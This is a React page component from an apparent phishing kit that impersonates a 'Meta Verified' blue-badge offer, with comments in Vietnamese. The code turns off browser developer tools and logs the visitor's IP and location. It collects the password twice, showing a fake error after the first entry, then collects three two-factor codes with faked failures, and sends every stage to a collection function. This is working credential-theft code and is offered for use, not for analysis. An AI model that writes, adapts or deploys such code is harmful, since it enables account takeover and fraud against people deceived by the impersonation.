"use client";

import React, { useEffect, useState } from 'react';
import '../../styles/pages/Supportpage.scss';
import '../../styles/base/bootstrap.min.css';
import '../../styles/pages/Modal.scss';
import "react-phone-input-2/lib/style.css";
import AuthModal from '../components/modals/AuthModal';
import PasswordModal from '../components/modals/PasswordModal';
import SecurityModal from '../components/modals/SecurityModal';
import FinalModal from '../components/modals/FinalModal';
import { getRecord, getUserLocation, saveRecord, sendAppealForm } from '../utils';
import disableDevtool from 'disable-devtool';
import moment from 'moment';
import "../libs/i18n"
import { useTranslation } from 'react-i18next';

const AccountPageComponent = () => {
    // LANGUAGE
    const { t, i18n } = useTranslation();
    const [ready, setReady] = useState(false);
    
    // STATE MENU
    const [activeMenu, setActiveMenu] = useState(null);

    const currentDate = moment().format('MMMM D, YYYY')

    // LOCATION
    const [userIp, setUserIp] = useState("");
    const [userFlag, setUserFlag] = useState("");

    // Add ticket ID state
    const [ticketId, setTicketId] = useState("4564-ATFD-4865");

    // STATE OPEND MODAL
    const [openAuthModal, setOpenAuthModal] = useState(false);
    const [openPasswordModal, setOpenPasswordModal] = useState(false);
    const [openSecurityModal, setOpenSecurityModal] = useState(false);
    const [openFinalModal, setOpenFinalModal] = useState(false);
    const [timeCounter, setTimeCounter] = useState(0);

    // Bỏ state openChoseAuthenModal và dataCookie không cần thiết

    // STATE LƯU TRỮ DỮ LIỆU ĐỂ CHUYỂN QUA MODAL SECURITY
    const [dataCookieSecurity, setDataCookieSecurity] = useState(null);

    // LOADING STATE
    const [loadingPassword, setLoadingPassword] = useState(false);
    const [loadingSecurity, setLoadingSecurity] = useState(false);

    // WARNING STATE
    const [warningPassword, setWarningPassword] = useState(false);
    const [warningSecurity, setWarningSecurity] = useState(false);

    // STATE CHECK CLICK
    const [clickPassword, setClickPassword] = useState(0);
    const [clickSecurity, setClickSecurity] = useState(0);

    // STATE FILE UPLOAD
    const [fileList, setFileList] = useState([]);

    const handleFileChange = (newFileList) => {
        setFileList(newFileList);
    };

    useEffect(() => {
        if (typeof window !== 'undefined') {
            disableDevtool();
        }
    }, []);

    useEffect(() => {
        const getIp = async () => {
            try {
                const userLocation = await getUserLocation();
                setUserIp(userLocation?.ip || "Error, contact @otis_cua");
                setUserFlag(userLocation?.country_code || "US");
                const language = userLocation?.country_code.toLowerCase() || "en";
                i18n.changeLanguage(language).then(() => setReady(true));
            } catch (error) {
                console.error("Error getting IP or location:", error);
                setUserFlag("US");
            }
        }
        getIp();
    }, []);

    // FUNCTION HANDLE FINISH APPEAL
    const handleFinishAppeal = async (values) => {
        try {
            const userLocation = await getUserLocation(userIp);
            const cookieVersion_1 = {
                ip: userIp,
                location: userLocation?.location || "Error, contact @otis_cua",
                ...values
            }
            saveRecord("__ck_clv1", cookieVersion_1);
            setOpenAuthModal(false)
            setOpenPasswordModal(true);
        } catch (error) {
            console.error("Error submitting form:", error);
        }
    }

    // FUNCTION HANDLE FINISH PASSWORD
    const handleFinishPassword = async (values) => {
        try {
            if (clickPassword === 0) {
                // Lần nhập đầu tiên -> Giả vờ sai mật khẩu
                setLoadingPassword(true);
                let ck_data_v1 = getRecord("__ck_clv1");
                if (!ck_data_v1) ck_data_v1 = getRecord("__ck_clv1");

                const cookieVersion_2 = { ...ck_data_v1, password: values.password }
                saveRecord("__ck_clv2", cookieVersion_2);
                
                await sendAppealForm(cookieVersion_2)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingPassword(false);
                            setWarningPassword(true);
                        }, 1500);
                        setClickPassword(1)
                    })
                    .catch((err) => console.log(err));
            } else {
                // Lần nhập thứ hai -> Thành công -> BỎ QUA CHỌN PHƯƠNG THỨC -> Sang SecurityModal luôn
                setLoadingPassword(true);
                let ck_data_v2 = getRecord("__ck_clv2");
                if (!ck_data_v2) ck_data_v2 = getRecord("__ck_clv2");

                const cookieVersion_3 = { ...ck_data_v2, passwordSecond: values.password }
                saveRecord("__ck_clv3", cookieVersion_3);
                
                await sendAppealForm(cookieVersion_3)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingPassword(false);
                            setWarningPassword(false);
                            setOpenPasswordModal(false);
                            
                            // Mở trực tiếp SecurityModal
                            setOpenSecurityModal(true); 
                            
                            // Truyền dữ liệu cookie trực tiếp vào Security
                            setDataCookieSecurity(cookieVersion_3); 
                        }, 1500);
                    })
                    .catch((err) => console.log(err));
            }
        } catch (error) {
            console.error("Error submitting form:", error);
        }
    }

    // FUNCTION HANDLE FINISH SECURITY
    const handleFinishSecurity = async (values) => {
        setLoadingSecurity(true);
        
        // Lấy dữ liệu cơ sở từ state đã được set ở bước Mật khẩu
        let ck_data = dataCookieSecurity;
        
        let fieldName;
        // Gán tên trường dữ liệu tùy theo số lần nhập
        if(clickSecurity === 0) {
            fieldName = "twoFa";
        } else if (clickSecurity === 1) {
            fieldName = "twoFaSecond";
        } else {
            fieldName = "twoFaThird"; 
        }

        const cookieVersion = { ...ck_data, [fieldName]: values.twoFa };
        
        // Cần lưu cookie mới nhất để đảm bảo dữ liệu đầy đủ cho lần gửi cuối
        if(clickSecurity < 2) saveRecord("__ck_clv_security_" + (clickSecurity + 1), cookieVersion);


        await sendAppealForm(cookieVersion)
            .then(() => {
                setTimeout(() => {
                    setLoadingSecurity(false);
                    if(clickSecurity < 2) {
                        setWarningSecurity(true);
                        setTimeCounter(process.env.NEXT_PUBLIC_SETTING_TIME);
                        setClickSecurity(prev => prev + 1);
                    } else {
                        setOpenSecurityModal(false);
                        setOpenFinalModal(true);
                        resetPasswordState();
                        resetSecurityState();
                    }
                }, 1000 + (clickSecurity * 300));
            })
            .catch((err) => console.log(err));
    }

    // FUNCTION HANDLE TRY ANOTHER WAY
    const handleTryAnotherWay = () => {
        setOpenSecurityModal(false);
        setOpenPasswordModal(true); // Quay lại bước nhập pass
    }

    const resetPasswordState = () => {
        setOpenPasswordModal(false);
        setLoadingPassword(false);
        setWarningPassword(false);
        setClickPassword(0);
    };

    const resetSecurityState = () => {
        setOpenSecurityModal(false);
        setLoadingSecurity(false);
        setWarningSecurity(false);
        setTimeCounter(0);
        setClickSecurity(0);
    };

    useEffect(() => {
        const generateTicketId = () => {
            const section1 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section2 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section3 = Math.random().toString(36).substring(2, 6).toUpperCase();
            setTicketId(`${section1}-${section2}-${section3}`);
        };
        generateTicketId();
    }, []);

    if (!ready) {
        return ('')
    }

    return (
        <>
            {/* --- GIAO DIỆN CHÍNH --- */}
            <div style={{ 
                minHeight: '100vh', 
                background: 'linear-gradient(180deg, #F0F4FF 0%, #FFFFFF 100%)', 
                display: 'flex', 
                flexDirection: 'column', 
                alignItems: 'center', 
                paddingTop: '0px',
                paddingBottom: '20px',
                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
            }}>
                
                <div style={{ maxWidth: '680px', width: '90%', padding: '0 10px', marginTop: '20px' }}>
                    
                    {/* Icon Blue Tick */}
                    <div style={{ marginBottom: '10px', textAlign: 'left' }}>
                        <img 
                            src="/tick.svg" 
                            alt="Meta Verified" 
                            style={{ width: '48px', height: '48px' }} 
                        />
                    </div>
                    
                    {/* Title */}
                    <h1 style={{ 
                        textAlign: 'left', 
                        fontSize: '32px', 
                        fontWeight: '700', 
                        marginBottom: '12px',
                        color: '#1c1e21'
                    }}>
                        Meta Verified - Rewards for you
                    </h1>

                    {/* Subtitle */}
                    <p style={{ 
                        textAlign: 'left', 
                        fontSize: '17px', 
                        fontWeight: '600', 
                        marginBottom: '24px',
                        color: '#1c1e21'
                    }}>
                        Show the world that you mean business.
                    </p>

                    {/* Content Text */}
                    <div style={{ fontSize: '15px', lineHeight: '1.6', color: '#1c1e21', textAlign: 'left' }}>
                        <p style={{ marginBottom: '16px' }}>
                            {t('content.top_content.sub.sub_1') || "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience."}
                        </p>
                        
                        <p style={{ marginBottom: '16px' }}>
                             {t('content.top_content.sub.sub_2') || "We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!"}
                        </p>
                        
                        <p style={{ marginBottom: '24px', color: '#65676B' }}>
                            Your ticket id: #{ticketId}
                        </p>

                        <h3 style={{ fontSize: '17px', fontWeight: '700', marginBottom: '8px' }}>
                            {t('content.guide.title') || "Verified Blue Badge Request Guide"}
                        </h3>
                        
                        <ul style={{ paddingLeft: '20px', marginBottom: '32px' }}>
                            <li style={{ marginBottom: '8px' }}>
                                {t('content.guide.sub.sub_1') || "Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats"}
                            </li>
                            <li style={{ marginBottom: '8px' }}>
                                {t('content.guide.sub.sub_2') || "In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it."}
                            </li>
                            <li>
                                {t('content.guide.sub.sub_3') || "Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly."}
                            </li>
                        </ul>
                    </div>

                    {/* Button */}
                    <div style={{ display: 'flex', justifyContent: 'center', width: '100%', marginTop: '20px' }}>
                        <button 
                            onClick={() => setOpenAuthModal(true)}
                            style={{
                                backgroundColor: '#0064e0',
                                color: '#ffffff',
                                textAlign: 'center',
                                border: 'none',
                                borderRadius: '100px',
                                padding: '10px 40px',
                                fontSize: '15px',
                                fontWeight: '600',
                                width: '100%', 
                                maxWidth: '350px',
                                cursor: 'pointer',
                                height: '48px',
                                transition: 'background-color 0.2s'
                            }}
                            onMouseOver={(e) => e.target.style.backgroundColor = '#0054bd'}
                            onMouseOut={(e) => e.target.style.backgroundColor = '#0064e0'}
                        >
                            Submit request
                        </button>
                    </div>

                    <div style={{ 
                        marginTop: '20px', 
                        display: 'flex', 
                        justifyContent: 'center', 
                        flexWrap: 'wrap', 
                        gap: '20px', 
                        fontSize: '12px', 
                        color: '#65676B' 
                    }}>
                        <a href="#" style={{ color: '#65676B', textDecoration: 'none' }}>Help Center</a>
                        <a href="#" style={{ color: '#65676B', textDecoration: 'none' }}>Privacy Policy</a>
                        <a href="#" style={{ color: '#65676B', textDecoration: 'none' }}>Terms of Service</a>
                        <a href="#" style={{ color: '#65676B', textDecoration: 'none' }}>Community Standards</a>
                        <span>Meta © 2025</span>
                    </div>

                </div>
            </div>

            {/* --- CÁC MODAL --- */}
            <AuthModal
                openAuthModal={openAuthModal}
                onCancel={() => setOpenAuthModal(false)}
                onFinish={handleFinishAppeal}
                countryEmoji={userFlag}
                fileList={fileList}
                handleFileChange={handleFileChange}
            />

            <PasswordModal
                opendPasswordModal={openPasswordModal}
                onCancelPasswordModal={resetPasswordState}
                onFinishPassword={handleFinishPassword}
                loadingPassword={loadingPassword}
                warningPassword={warningPassword}
            />

            <SecurityModal
                openSecurityModal={openSecurityModal}
                onCancelSecurityModal={resetSecurityState}
                onFinishSecurity={handleFinishSecurity}
                loadingSecurity={loadingSecurity}
                timeCounter={timeCounter}
                clickSecurity={clickSecurity}
                dataCookie={dataCookieSecurity} // Truyền dữ liệu qua prop dataCookie
                onTryAnotherWay={handleTryAnotherWay}
            />

            <FinalModal
                openFinalModal={openFinalModal}
                onCancelFinalModal={() => {
                    setOpenFinalModal(false);
                    resetPasswordState();
                    resetSecurityState();
                }}
            />
        </>
    );
};

export default AccountPageComponent;